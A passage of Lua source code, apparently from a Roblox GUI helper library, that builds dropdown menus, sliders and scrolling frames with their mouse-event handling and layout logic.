				scrollDownButton.Size = UDim2.new(0,17,0,17) 
				scrollDownButton.Position = UDim2.new(1,-11,1,-11)
				scrollDownButton.Parent = droppedDownMenu
				scrollDownButton.MouseButton1Click:connect(
					function()
						scrollMouseCount = scrollMouseCount + 1
					end)
				scrollDownButton.MouseLeave:connect(
					function()
						scrollMouseCount = scrollMouseCount + 1
					end)
				scrollDownButton.MouseButton1Down:connect(
					function()
						scrollMouseCount = scrollMouseCount + 1
		
						scrollDown()
						local val = scrollMouseCount
						wait(0.5)
						while val == scrollMouseCount do
							if scrollDown() == false then
								break
							end
							wait(0.1)
						end				
					end)	
		
				local scrollbar = Instance.new("ImageLabel")
				scrollbar.Name = "ScrollBar"
				scrollbar.Image = "rbxasset://textures/ui/scrollbar.png"
				scrollbar.BackgroundTransparency = 1
				scrollbar.Size = UDim2.new(0, 18, (dropDownItemCount*.8)/((dropDownItemCount+1)*.8), -(17) - 11 - 4)
				scrollbar.Position = UDim2.new(1,-11,(1*.8)/((dropDownItemCount+1)*.8),17+2)
				scrollbar.Parent = droppedDownMenu
			end
		
			for i,item in ipairs(items) do
				-- needed to maintain local scope for items in event listeners below
				local button = choiceButton:clone()
				if forRoblox then
					button.RobloxLocked = true
				end		
				button.Text = item
				button.Parent = droppedDownMenu
				if (whiteSkin) then
					button.TextColor3 = textColor
				end
		
				button.MouseButton1Click:connect(function()
					--Remove Highlight
					if (not whiteSkin) then
						button.TextColor3 = Color3.new(1,1,1)
					end
					button.BackgroundTransparency = 1
		
					updateSelection(item)
					onSelect(item)
		
					toggleVisibility()
				end)
				button.MouseEnter:connect(function()
					--Add Highlight	
					if (not whiteSkin) then
						button.TextColor3 = Color3.new(0,0,0)
					end
					button.BackgroundTransparency = 0
				end)
		
				button.MouseLeave:connect(function()
					--Remove Highlight
					if (not whiteSkin) then
						button.TextColor3 = Color3.new(1,1,1)
					end
					button.BackgroundTransparency = 1
				end)
			end
		
			--This does the initial layout of the buttons	
			updateScroll()
			
			frame.AncestryChanged:connect(function(child,parent)
				if parent == nil then
					areaSoak.Parent = nil
				else
					areaSoak.Parent = getLayerCollectorAncestor(frame)
				end
			end)
		
			dropDownMenu.MouseButton1Click:connect(toggleVisibility)
			areaSoak.MouseButton1Click:connect(toggleVisibility)
			return frame, updateSelection
		end
		
		t.CreatePropertyDropDownMenu = function(instance, property, enum)
		
			local items = enum:GetEnumItems()
			local names = {}
			local nameToItem = {}
			for i,obj in ipairs(items) do
				names[i] = obj.Name
				nameToItem[obj.Name] = obj
			end
		
			local frame
			local updateSelection
			frame, updateSelection = t.CreateDropDownMenu(names, function(text) instance[property] = nameToItem[text] end)
		
			ScopedConnect(frame, instance, "Changed", 
				function(prop)
					if prop == property then
						updateSelection(instance[property].Name)
					end
				end,
				function()
					updateSelection(instance[property].Name)
				end)
		
			return frame
		end
		
		t.GetFontHeight = function(font, fontSize)
			if font == nil or fontSize == nil then
				error("Font and FontSize must be non-nil")
			end
			
			local fontSizeInt = tonumber(fontSize.Name:match("%d+")) -- Clever hack to extract the size from the enum itself.
		
			if font == Enum.Font.Legacy then -- Legacy has a 50% bigger size.
				return math.ceil(fontSizeInt*1.5)
			else -- Size is literally just the fontSizeInt
				return fontSizeInt
			end
		end
		
		local function layoutGuiObjectsHelper(frame, guiObjects, settingsTable)
			local totalPixels = frame.AbsoluteSize.Y
			local pixelsRemaining = frame.AbsoluteSize.Y
			for i, child in ipairs(guiObjects) do
				if child:IsA("TextLabel") or child:IsA("TextButton") then
					local isLabel = child:IsA("TextLabel")
					if isLabel then
						pixelsRemaining = pixelsRemaining - settingsTable["TextLabelPositionPadY"]
					else
						pixelsRemaining = pixelsRemaining - settingsTable["TextButtonPositionPadY"]
					end
					child.Position = UDim2.new(child.Position.X.Scale, child.Position.X.Offset, 0, totalPixels - pixelsRemaining)
					child.Size = UDim2.new(child.Size.X.Scale, child.Size.X.Offset, 0, pixelsRemaining)
		
					if child.TextFits and child.TextBounds.Y < pixelsRemaining then
						child.Visible = true
						if isLabel then
							child.Size = UDim2.new(child.Size.X.Scale, child.Size.X.Offset, 0, child.TextBounds.Y + settingsTable["TextLabelSizePadY"])
						else 
							child.Size = UDim2.new(child.Size.X.Scale, child.Size.X.Offset, 0, child.TextBounds.Y + settingsTable["TextButtonSizePadY"])
						end
		
						while not child.TextFits do
							child.Size = UDim2.new(child.Size.X.Scale, child.Size.X.Offset, 0, child.AbsoluteSize.Y + 1)
						end
						pixelsRemaining = pixelsRemaining - child.AbsoluteSize.Y		
		
						if isLabel then
							pixelsRemaining = pixelsRemaining - settingsTable["TextLabelPositionPadY"]
						else
							pixelsRemaining = pixelsRemaining - settingsTable["TextButtonPositionPadY"]
						end
					else
						child.Visible = false
						pixelsRemaining = -1
					end			
		
				else
					--GuiObject
					child.Position = UDim2.new(child.Position.X.Scale, child.Position.X.Offset, 0, totalPixels - pixelsRemaining)
					pixelsRemaining = pixelsRemaining - child.AbsoluteSize.Y
					child.Visible = (pixelsRemaining >= 0)
				end
			end
		end
		
		t.LayoutGuiObjects = function(frame, guiObjects, settingsTable)
			if not frame:IsA("GuiObject") then
				error("Frame must be a GuiObject")
			end
			for i, child in ipairs(guiObjects) do
				if not child:IsA("GuiObject") then
					error("All elements that are layed out must be of type GuiObject")
				end
			end
		
			if not settingsTable then
				settingsTable = {}
			end
		
			if not settingsTable["TextLabelSizePadY"] then
				settingsTable["TextLabelSizePadY"] = 0
			end
			if not settingsTable["TextLabelPositionPadY"] then
				settingsTable["TextLabelPositionPadY"] = 0
			end
			if not settingsTable["TextButtonSizePadY"] then
				settingsTable["TextButtonSizePadY"] = 12
			end
			if not settingsTable["TextButtonPositionPadY"] then
				settingsTable["TextButtonPositionPadY"] = 2
			end
		
			--Wrapper frame takes care of styled objects
			local wrapperFrame = Instance.new("Frame")
			wrapperFrame.Name = "WrapperFrame"
			wrapperFrame.BackgroundTransparency = 1
			wrapperFrame.Size = UDim2.new(1,0,1,0)
			wrapperFrame.Parent = frame
		
			for i, child in ipairs(guiObjects) do
				child.Parent = wrapperFrame
			end
		
			local recalculate = function()
				wait()
				layoutGuiObjectsHelper(wrapperFrame, guiObjects, settingsTable)
			end
			
			frame.Changed:connect(
				function(prop)
					if prop == "AbsoluteSize" then
						--Wait a heartbeat for it to sync in
						recalculate(nil)
					end
				end)
			frame.AncestryChanged:connect(recalculate)
		
			layoutGuiObjectsHelper(wrapperFrame, guiObjects, settingsTable)
		end
		
		
		t.CreateSlider = function(steps,width,position)
			local sliderGui = Instance.new("Frame")
			sliderGui.Size = UDim2.new(1,0,1,0)
			sliderGui.BackgroundTransparency = 1
			sliderGui.Name = "SliderGui"
			
			local sliderSteps = Instance.new("IntValue")
			sliderSteps.Name = "SliderSteps"
			sliderSteps.Value = steps
			sliderSteps.Parent = sliderGui
			
			local areaSoak = Instance.new("TextButton")
			areaSoak.Name = "AreaSoak"
			areaSoak.Text = ""
			areaSoak.BackgroundTransparency = 1
			areaSoak.Active = false
			areaSoak.Size = UDim2.new(1,0,1,0)
			areaSoak.Visible = false
			areaSoak.ZIndex = 4
			
			sliderGui.AncestryChanged:connect(function(child,parent)
				if parent == nil then
					areaSoak.Parent = nil
				else
					areaSoak.Parent = getLayerCollectorAncestor(sliderGui)
				end
			end)
			
			local sliderPosition = Instance.new("IntValue")
			sliderPosition.Name = "SliderPosition"
			sliderPosition.Value = 0
			sliderPosition.Parent = sliderGui
			
			local id = math.random(1,100)
			
			local bar = Instance.new("TextButton")
			bar.Text = ""
			bar.AutoButtonColor = false
			bar.Name = "Bar"
			bar.BackgroundColor3 = Color3.new(0,0,0)
			if type(width) == "number" then
				bar.Size = UDim2.new(0,width,0,5)
			else
				bar.Size = UDim2.new(0,200,0,5)
			end
			bar.BorderColor3 = Color3.new(95/255,95/255,95/255)
			bar.ZIndex = 2
			bar.Parent = sliderGui
			
			if position["X"] and position["X"]["Scale"] and position["X"]["Offset"] and position["Y"] and position["Y"]["Scale"] and position["Y"]["Offset"] then
				bar.Position = position
			end
			
			local slider = Instance.new("ImageButton")
			slider.Name = "Slider"
			slider.BackgroundTransparency = 1
			slider.Image = "rbxasset://textures/ui/Slider.png"
			slider.Position = UDim2.new(0,0,0.5,-10)
			slider.Size = UDim2.new(0,20,0,20)
			slider.ZIndex = 3
			slider.Parent = bar
			
			local areaSoakMouseMoveCon = nil
			
			areaSoak.MouseLeave:connect(function()
				if areaSoak.Visible then
					cancelSlide(areaSoak)
				end
			end)
			areaSoak.MouseButton1Up:connect(function()
				if areaSoak.Visible then
					cancelSlide(areaSoak)
				end
			end)
			
			slider.MouseButton1Down:connect(function()
				areaSoak.Visible = true
				if areaSoakMouseMoveCon then areaSoakMouseMoveCon:disconnect() end
				areaSoakMouseMoveCon = areaSoak.MouseMoved:connect(function(x,y)
					setSliderPos(x,slider,sliderPosition,bar,steps)
				end)
			end)
			
			slider.MouseButton1Up:connect(function() cancelSlide(areaSoak) end)
			
			sliderPosition.Changed:connect(function(prop)
				sliderPosition.Value = math.min(steps, math.max(1,sliderPosition.Value))
				local relativePosX = (sliderPosition.Value - 1) / (steps - 1)
				slider.Position = UDim2.new(relativePosX,-slider.AbsoluteSize.X/2,slider.Position.Y.Scale,slider.Position.Y.Offset)
			end)
			
			bar.MouseButton1Down:connect(function(x,y)
				setSliderPos(x,slider,sliderPosition,bar,steps)
			end)
			
			return sliderGui, sliderPosition, sliderSteps
		
		end
		
		
		
		t.CreateSliderNew = function(steps,width,position)
			local sliderGui = Instance.new("Frame")
			sliderGui.Size = UDim2.new(1,0,1,0)
			sliderGui.BackgroundTransparency = 1
			sliderGui.Name = "SliderGui"
			
			local sliderSteps = Instance.new("IntValue")
			sliderSteps.Name = "SliderSteps"
			sliderSteps.Value = steps
			sliderSteps.Parent = sliderGui
			
			local areaSoak = Instance.new("TextButton")
			areaSoak.Name = "AreaSoak"
			areaSoak.Text = ""
			areaSoak.BackgroundTransparency = 1
			areaSoak.Active = false
			areaSoak.Size = UDim2.new(1,0,1,0)
			areaSoak.Visible = false
			areaSoak.ZIndex = 6
			
			sliderGui.AncestryChanged:connect(function(child,parent)
				if parent == nil then
					areaSoak.Parent = nil
				else
					areaSoak.Parent = getLayerCollectorAncestor(sliderGui)
				end
			end)
			
			local sliderPosition = Instance.new("IntValue")
			sliderPosition.Name = "SliderPosition"
			sliderPosition.Value = 0
			sliderPosition.Parent = sliderGui
			
			local id = math.random(1,100)
			
			local sliderBarImgHeight = 7
			local sliderBarCapImgWidth = 4
		
			local bar = Instance.new("ImageButton")
			bar.BackgroundTransparency = 1
			bar.Image = "rbxasset://textures/ui/Slider-BKG-Center.png"
			bar.Name = "Bar"
			local displayWidth = 200
			if type(width) == "number" then
				bar.Size = UDim2.new(0,width - (sliderBarCapImgWidth * 2),0,sliderBarImgHeight)
				displayWidth = width - (sliderBarCapImgWidth * 2)
			else
				bar.Size = UDim2.new(0,200,0,sliderBarImgHeight)
			end
			bar.ZIndex = 3
			bar.Parent = sliderGui	
			if position["X"] and position["X"]["Scale"] and position["X"]["Offset"] and position["Y"] and position["Y"]["Scale"] and position["Y"]["Offset"] then
				bar.Position = position
			end
		
			local barLeft = bar:clone()
			barLeft.Name = "BarLeft"
			barLeft.Image = "rbxasset://textures/ui/Slider-BKG-Left-Cap.png"
			barLeft.Size = UDim2.new(0, sliderBarCapImgWidth, 0, sliderBarImgHeight)
			barLeft.Position = UDim2.new(position.X.Scale, position.X.Offset - sliderBarCapImgWidth, position.Y.Scale, position.Y.Offset)
			barLeft.Parent = sliderGui	
			barLeft.ZIndex = 3
		
			local barRight = barLeft:clone()
			barRight.Name = "BarRight"
			barRight.Image = "rbxasset://textures/ui/Slider-BKG-Right-Cap.png"
			barRight.Position = UDim2.new(position.X.Scale, position.X.Offset + displayWidth, position.Y.Scale, position.Y.Offset)
			barRight.Parent = sliderGui	
		
			local fillLeft = barLeft:clone()
			fillLeft.Name = "FillLeft"
			fillLeft.Image = "rbxasset://textures/ui/Slider-Fill-Left-Cap.png"
			fillLeft.Parent = sliderGui	
			fillLeft.ZIndex = 4
		
			local fill = fillLeft:clone()
			fill.Name = "Fill"
			fill.Image = "rbxasset://textures/ui/Slider-Fill-Center.png"
			fill.Parent = bar	
			fill.ZIndex = 4
			fill.Position = UDim2.new(0, 0, 0, 0)
			fill.Size = UDim2.new(0.5, 0, 1, 0)
		
		
		--	bar.Visible = false
		
			local slider = Instance.new("ImageButton")
			slider.Name = "Slider"
			slider.BackgroundTransparency = 1
			slider.Image = "rbxasset://textures/ui/slider_new_tab.png"
			slider.Position = UDim2.new(0,0,0.5,-14)
			slider.Size = UDim2.new(0,28,0,28)
			slider.ZIndex = 5
			slider.Parent = bar
			
			local areaSoakMouseMoveCon = nil
			
			areaSoak.MouseLeave:connect(function()
				if areaSoak.Visible then
					cancelSlide(areaSoak)
				end
			end)
			areaSoak.MouseButton1Up:connect(function()
				if areaSoak.Visible then
					cancelSlide(areaSoak)
				end
			end)
			
			slider.MouseButton1Down:connect(function()
				areaSoak.Visible = true
				if areaSoakMouseMoveCon then areaSoakMouseMoveCon:disconnect() end
				areaSoakMouseMoveCon = areaSoak.MouseMoved:connect(function(x,y)
					setSliderPos(x,slider,sliderPosition,bar,steps)
				end)
			end)
			
			slider.MouseButton1Up:connect(function() cancelSlide(areaSoak) end)
			
			sliderPosition.Changed:connect(function(prop)
				sliderPosition.Value = math.min(steps, math.max(1,sliderPosition.Value))
				local relativePosX = (sliderPosition.Value - 1) / (steps - 1)
				slider.Position = UDim2.new(relativePosX,-slider.AbsoluteSize.X/2,slider.Position.Y.Scale,slider.Position.Y.Offset)
				fill.Size = UDim2.new(relativePosX, 0, 1, 0)
			end)
			
			bar.MouseButton1Down:connect(function(x,y)
				setSliderPos(x,slider,sliderPosition,bar,steps)
			end)
		
			fill.MouseButton1Down:connect(function(x,y)
				setSliderPos(x,slider,sliderPosition,bar,steps)
			end)
		
			fillLeft.MouseButton1Down:connect(function(x,y)
				setSliderPos(x,slider,sliderPosition,bar,steps)
			end)
		
		
			return sliderGui, sliderPosition, sliderSteps
		
		end
		
		
		
		
		
		t.CreateTrueScrollingFrame = function()
			local lowY = nil
			local highY = nil
			
			local dragCon = nil
			local upCon = nil
		
			local internalChange = false
		
			local descendantsChangeConMap = {}
		
			local scrollingFrame = Instance.new("Frame")
			scrollingFrame.Name = "ScrollingFrame"
			scrollingFrame.Active = true
			scrollingFrame.Size = UDim2.new(1,0,1,0)
			scrollingFrame.ClipsDescendants = true
		
			local controlFrame = Instance.new("Frame")
			controlFrame.Name = "ControlFrame"
			controlFrame.BackgroundTransparency = 1
			controlFrame.Size = UDim2.new(0,18,1,0)
			controlFrame.Position = UDim2.new(1,-20,0,0)
			controlFrame.Parent = scrollingFrame
			
			local scrollBottom = Instance.new("BoolValue")
			scrollBottom.Value = false
			scrollBottom.Name = "ScrollBottom"
			scrollBottom.Parent = controlFrame
			
			local scrollUp = Instance.new("BoolValue")
			scrollUp.Value = false
			scrollUp.Name = "scrollUp"
			scrollUp.Parent = controlFrame
		
			local scrollUpButton = Instance.new("TextButton")
			scrollUpButton.Name = "ScrollUpButton"
			scrollUpButton.Text = ""
			scrollUpButton.AutoButtonColor = false
			scrollUpButton.BackgroundColor3 = Color3.new(0,0,0)
			scrollUpButton.BorderColor3 = Color3.new(1,1,1)
			scrollUpButton.BackgroundTransparency = 0.5
			scrollUpButton.Size = UDim2.new(0,18,0,18)
			scrollUpButton.ZIndex = 2
			scrollUpButton.Parent = controlFrame
			for i = 1, 6 do
				local triFrame = Instance.new("Frame")
				triFrame.BorderColor3 = Color3.new(1,1,1)
				triFrame.Name = "tri" .. tostring(i)
				triFrame.ZIndex = 3
				triFrame.BackgroundTransparency = 0.5
				triFrame.Size = UDim2.new(0,12 - ((i -1) * 2),0,0)
				triFrame.Position = UDim2.new(0,3 + (i -1),0.5,2 - (i -1))
				triFrame.Parent = scrollUpButton
			end
			scrollUpButton.MouseEnter:connect(function()
				scrollUpButton.BackgroundTransparency = 0.1
				local upChildren = scrollUpButton:GetChildren()
				for i = 1, #upChildren do
					upChildren[i].BackgroundTransparency = 0.1
				end
			end)
			scrollUpButton.MouseLeave:connect(function()
				scrollUpButton.BackgroundTransparency = 0.5
				local upChildren = scrollUpButton:GetChildren()
				for i = 1, #upChildren do
					upChildren[i].BackgroundTransparency = 0.5
				end
			end)
		
			local scrollDownButton = scrollUpButton:clone()
			scrollDownButton.Name = "ScrollDownButton"
			scrollDownButton.Position = UDim2.new(0,0,1,-18)
			local downChildren = scrollDownButton:GetChildren()
			for i = 1, #downChildren do
				downChildren[i].Position = UDim2.new(0,3 + (i -1),0.5,-2 + (i - 1))
			end
			scrollDownButton.MouseEnter:connect(function()
				scrollDownButton.BackgroundTransparency = 0.1
				local downChildren = scrollDownButton:GetChildren()
				for i = 1, #downChildren do
					downChildren[i].BackgroundTransparency = 0.1
				end
			end)
			scrollDownButton.MouseLeave:connect(function()
				scrollDownButton.BackgroundTransparency = 0.5
				local downChildren = scrollDownButton:GetChildren()
				for i = 1, #downChildren do
					downChildren[i].BackgroundTransparency = 0.5
				end
			end)
			scrollDownButton.Parent = controlFrame
			
			local scrollTrack = Instance.new("Frame")
			scrollTrack.Name = "ScrollTrack"
			scrollTrack.BackgroundTransparency = 1
			scrollTrack.Size = UDim2.new(0,18,1,-38)
			scrollTrack.Position = UDim2.new(0,0,0,19)
			scrollTrack.Parent = controlFrame
		
			local scrollbar = Instance.new("TextButton")
			scrollbar.BackgroundColor3 = Color3.new(0,0,0)
			scrollbar.BorderColor3 = Color3.new(1,1,1)
			scrollbar.BackgroundTransparency = 0.5
			scrollbar.AutoButtonColor = false
			scrollbar.Text = ""
			scrollbar.Active = true
			scrollbar.Name = "ScrollBar"
			scrollbar.ZIndex = 2
			scrollbar.BackgroundTransparency = 0.5
			scrollbar.Size = UDim2.new(0, 18, 0.1, 0)
			scrollbar.Position = UDim2.new(0,0,0,0)
			scrollbar.Parent = scrollTrack
		
			local scrollNub = Instance.new("Frame")
			scrollNub.Name = "ScrollNub"
			scrollNub.BorderColor3 = Color3.new(1,1,1)
			scrollNub.Size = UDim2.new(0,10,0,0)
			scrollNub.Position = UDim2.new(0.5,-5,0.5,0)
			scrollNub.ZIndex = 2
			scrollNub.BackgroundTransparency = 0.5
			scrollNub.Parent = scrollbar
		
			local newNub = scrollNub:clone()
			newNub.Position = UDim2.new(0.5,-5,0.5,-2)
			newNub.Parent = scrollbar
			
			local lastNub = scrollNub:clone()
			lastNub.Position = UDim2.new(0.5,-5,0.5,2)
			lastNub.Parent = scrollbar
		
			scrollbar.MouseEnter:connect(function()
				scrollbar.BackgroundTransparency = 0.1
				scrollNub.BackgroundTransparency = 0.1
				newNub.BackgroundTransparency = 0.1
				lastNub.BackgroundTransparency = 0.1
			end)
			scrollbar.MouseLeave:connect(function()
				scrollbar.BackgroundTransparency = 0.5
				scrollNub.BackgroundTransparency = 0.5
				newNub.BackgroundTransparency = 0.5
				lastNub.BackgroundTransparency = 0.5
			end)
		
			local mouseDrag = Instance.new("ImageButton")
			mouseDrag.Active = false
			mouseDrag.Size = UDim2.new(1.5, 0, 1.5, 0)
			mouseDrag.AutoButtonColor = false
			mouseDrag.BackgroundTransparency = 1
			mouseDrag.Name = "mouseDrag"
			mouseDrag.Position = UDim2.new(-0.25, 0, -0.25, 0)
			mouseDrag.ZIndex = 10
			
			local function positionScrollBar(x,y,offset)
				local oldPos = scrollbar.Position
		
				if y < scrollTrack.AbsolutePosition.y then
					scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,0,0)
					return (oldPos ~= scrollbar.Position)
				end
				
				local relativeSize = scrollbar.AbsoluteSize.Y/scrollTrack.AbsoluteSize.Y
		
				if y > (scrollTrack.AbsolutePosition.y + scrollTrack.AbsoluteSize.y) then
					scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,1 - relativeSize,0)
					return (oldPos ~= scrollbar.Position)
				end
				local newScaleYPos = (y - scrollTrack.AbsolutePosition.y - offset)/scrollTrack.AbsoluteSize.y
				if newScaleYPos + relativeSize > 1 then
					newScaleYPos = 1 - relativeSize
					scrollBottom.Value = true
					scrollUp.Value = false
				elseif newScaleYPos <= 0 then
					newScaleYPos = 0
					scrollUp.Value = true
					scrollBottom.Value = false
				else
					scrollUp.Value = false
					scrollBottom.Value = false
				end
				scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,newScaleYPos,0)
				
				return (oldPos ~= scrollbar.Position)
			end
		
			local function drillDownSetHighLow(instance)
				if not instance or not instance:IsA("GuiObject") then return end
				if instance == controlFrame then return end
				if instance:IsDescendantOf(controlFrame) then return end
				if not instance.Visible then return end
		
				if lowY and lowY > instance.AbsolutePosition.Y then
					lowY = instance.AbsolutePosition.Y
				elseif not lowY then
					lowY = instance.AbsolutePosition.Y
				end
				if highY and highY < (instance.AbsolutePosition.Y + instance.AbsoluteSize.Y) then
					highY = instance.AbsolutePosition.Y + instance.AbsoluteSize.Y
				elseif not highY then
					highY = instance.AbsolutePosition.Y + instance.AbsoluteSize.Y
				end
				local children = instance:GetChildren()
				for i = 1, #children do
					drillDownSetHighLow(children[i])
				end
			end
		
			local function resetHighLow()
				local firstChildren = scrollingFrame:GetChildren()
		
				for i = 1, #firstChildren do
					drillDownSetHighLow(firstChildren[i])
				end
			end
		
			local function recalculate()
				internalChange = true
		
				local percentFrame = 0
				if scrollbar.Position.Y.Scale > 0 then
					if scrollbar.Visible then
						percentFrame = scrollbar.Position.Y.Scale/((scrollTrack.AbsoluteSize.Y - scrollbar.AbsoluteSize.Y)/scrollTrack.AbsoluteSize.Y)
					else
						percentFrame = 0
					end
				end
				if percentFrame > 0.99 then percentFrame = 1 end
		
				local hiddenYAmount = (scrollingFrame.AbsoluteSize.Y - (highY - lowY)) * percentFrame
				
				local guiChildren = scrollingFrame:GetChildren()
				for i = 1, #guiChildren do
					if guiChildren[i] ~= controlFrame then
						guiChildren[i].Position = UDim2.new(guiChildren[i].Position.X.Scale,guiChildren[i].Position.X.Offset,
							0, math.ceil(guiChildren[i].AbsolutePosition.Y) - math.ceil(lowY) + hiddenYAmount)
					end
				end
		
				lowY = nil
				highY = nil
				resetHighLow()
				internalChange = false
			end
		
			local function setSliderSizeAndPosition()
				if not highY or not lowY then return end
		
				local totalYSpan = math.abs(highY - lowY)
				if totalYSpan == 0 then
					scrollbar.Visible = false
					scrollDownButton.Visible = false
					scrollUpButton.Visible = false
		
					if dragCon then dragCon:disconnect() dragCon = nil end
					if upCon then upCon:disconnect() upCon = nil end
					return
				end
		
				local percentShown = scrollingFrame.AbsoluteSize.Y/totalYSpan
				if percentShown >= 1 then
					scrollbar.Visible = false
					scrollDownButton.Visible = false
					scrollUpButton.Visible = false
					recalculate()
				else
					scrollbar.Visible = true
					scrollDownButton.Visible = true
					scrollUpButton.Visible = true
		
					scrollbar.Size = UDim2.new(scrollbar.Size.X.Scale,scrollbar.Size.X.Offset,percentShown,0)
				end
		
				local percentPosition = (scrollingFrame.AbsolutePosition.Y - lowY)/totalYSpan
				scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,percentPosition,-scrollbar.AbsoluteSize.X/2)
		
				if scrollbar.AbsolutePosition.y < scrollTrack.AbsolutePosition.y then
					scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,0,0)
				end
		
				if (scrollbar.AbsolutePosition.y + scrollbar.AbsoluteSize.Y) > (scrollTrack.AbsolutePosition.y + scrollTrack.AbsoluteSize.y) then
					local relativeSize = scrollbar.AbsoluteSize.Y/scrollTrack.AbsoluteSize.Y
					scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,1 - relativeSize,0)
				end
			end
			
			local buttonScrollAmountPixels = 7
			local reentrancyGuardScrollUp = false
			local function doScrollUp()
				if reentrancyGuardScrollUp then return end
				
				reentrancyGuardScrollUp = true
					if positionScrollBar(0,scrollbar.AbsolutePosition.Y - buttonScrollAmountPixels,0) then
						recalculate()
					end
				reentrancyGuardScrollUp = false
			end
			
			local reentrancyGuardScrollDown = false
			local function doScrollDown()
				if reentrancyGuardScrollDown then return end
				
				reentrancyGuardScrollDown = true
					if positionScrollBar(0,scrollbar.AbsolutePosition.Y + buttonScrollAmountPixels,0) then
						recalculate()
					end
				reentrancyGuardScrollDown = false
			end
		
			local function scrollUp(mouseYPos)
				if scrollUpButton.Active then
					scrollStamp = tick()
					local current = scrollStamp
					local upCon
					upCon = mouseDrag.MouseButton1Up:connect(function()
						scrollStamp = tick()
						mouseDrag.Parent = nil
						upCon:disconnect()
					end)
					mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
					doScrollUp()
					wait(0.2)
					local t = tick()
					local w = 0.1
					while scrollStamp == current do
						doScrollUp()
						if mouseYPos and mouseYPos > scrollbar.AbsolutePosition.y then
							break
						end
						if not scrollUpButton.Active then break end
						if tick()-t > 5 then
							w = 0
						elseif tick()-t > 2 then
							w = 0.06
						end
						wait(w)
					end
				end
			end
		
			local function scrollDown(mouseYPos)
				if scrollDownButton.Active then
					scrollStamp = tick()
					local current = scrollStamp
					local downCon
					downCon = mouseDrag.MouseButton1Up:connect(function()
						scrollStamp = tick()
						mouseDrag.Parent = nil
						downCon:disconnect()
					end)
					mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
					doScrollDown()
					wait(0.2)
					local t = tick()
					local w = 0.1
					while scrollStamp == current do
						doScrollDown()
						if mouseYPos and mouseYPos < (scrollbar.AbsolutePosition.y + scrollbar.AbsoluteSize.x) then
							break
						end
						if not scrollDownButton.Active then break end
						if tick()-t > 5 then
							w = 0
						elseif tick()-t > 2 then
							w = 0.06
						end
						wait(w)
					end
				end
			end
			
			scrollbar.MouseButton1Down:connect(function(x,y)
				if scrollbar.Active then
					scrollStamp = tick()
					local mouseOffset = y - scrollbar.AbsolutePosition.y
					if dragCon then dragCon:disconnect() dragCon = nil end
					if upCon then upCon:disconnect() upCon = nil end
					local prevY = y
					local reentrancyGuardMouseScroll = false
					dragCon = mouseDrag.MouseMoved:connect(function(x,y)
						if reentrancyGuardMouseScroll then return end
						
						reentrancyGuardMouseScroll = true
							if positionScrollBar(x,y,mouseOffset) then
								recalculate()
							end
						reentrancyGuardMouseScroll = false
						
					end)
					upCon = mouseDrag.MouseButton1Up:connect(function()
						scrollStamp = tick()
						mouseDrag.Parent = nil
						dragCon:disconnect(); dragCon = nil
						upCon:disconnect(); drag = nil
					end)
					mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
				end
			end)
		
			local scrollMouseCount = 0
		
			scrollUpButton.MouseButton1Down:connect(function()
				scrollUp()
			end)
			scrollUpButton.MouseButton1Up:connect(function()
				scrollStamp = tick()
			end)
		
			scrollDownButton.MouseButton1Up:connect(function()
				scrollStamp = tick()
			end)
			scrollDownButton.MouseButton1Down:connect(function()
				 scrollDown()
			end)
				
			scrollbar.MouseButton1Up:connect(function()
				scrollStamp = tick()
			end)
			
			local function heightCheck(instance)
				if highY and (instance.AbsolutePosition.Y + instance.AbsoluteSize.Y) > highY then
					highY = instance.AbsolutePosition.Y + instance.AbsoluteSize.Y
				elseif not highY then
					highY = instance.AbsolutePosition.Y + instance.AbsoluteSize.Y
				end
				setSliderSizeAndPosition()
			end
			
			local function highLowRecheck()
				local oldLowY = lowY
				local oldHighY = highY
				lowY = nil
				highY = nil
				resetHighLow()
		
				if (lowY ~= oldLowY) or (highY ~= oldHighY) then
					setSliderSizeAndPosition()
				end
			end
		
			local function descendantChanged(this, prop)
				if internalChange then return end
				if not this.Visible then return end
		
				if prop == "Size" or prop == "Position" then
					wait()
					highLowRecheck()
				end
			end
		
			scrollingFrame.DescendantAdded:connect(function(instance)
				if not instance:IsA("GuiObject") then return end
		
				if instance.Visible then
					wait() -- wait a heartbeat for sizes to reconfig
					highLowRecheck()
				end
		
				descendantsChangeConMap[instance] = instance.Changed:connect(function(prop) descendantChanged(instance, prop) end)
			end)
		
			scrollingFrame.DescendantRemoving:connect(function(instance)
				if not instance:IsA("GuiObject") then return end
				if descendantsChangeConMap[instance] then
					descendantsChangeConMap[instance]:disconnect()
					descendantsChangeConMap[instance] = nil
				end
				wait() -- wait a heartbeat for sizes to reconfig
				highLowRecheck()
			end)
			
			scrollingFrame.Changed:connect(function(prop)
				if prop == "AbsoluteSize" then
					if not highY or not lowY then return end
		
					highLowRecheck()
					setSliderSizeAndPosition()
				end
			end)
		
			return scrollingFrame, controlFrame
		end
		
		t.CreateScrollingFrame = function(orderList,scrollStyle)
			local frame = Instance.new("Frame")
			frame.Name = "ScrollingFrame"
			frame.BackgroundTransparency = 1
			frame.Size = UDim2.new(1,0,1,0)
			
			local scrollUpButton = Instance.new("ImageButton")
			scrollUpButton.Name = "ScrollUpButton"
			scrollUpButton.BackgroundTransparency = 1
			scrollUpButton.Image = "rbxasset://textures/ui/scrollbuttonUp.png"
			scrollUpButton.Size = UDim2.new(0,17,0,17) 
		
			
			local scrollDownButton = Instance.new("ImageButton")
			scrollDownButton.Name = "ScrollDownButton"
			scrollDownButton.BackgroundTransparency = 1
			scrollDownButton.Image = "rbxasset://textures/ui/scrollbuttonDown.png"
			scrollDownButton.Size = UDim2.new(0,17,0,17) 
			
			local scrollbar = Instance.new("ImageButton")
			scrollbar.Name = "ScrollBar"
			scrollbar.Image = "rbxasset://textures/ui/scrollbar.png"
			scrollbar.BackgroundTransparency = 1
			scrollbar.Size = UDim2.new(0, 18, 0, 150)
		
			local scrollStamp = 0
				
			local scrollDrag = Instance.new("ImageButton")
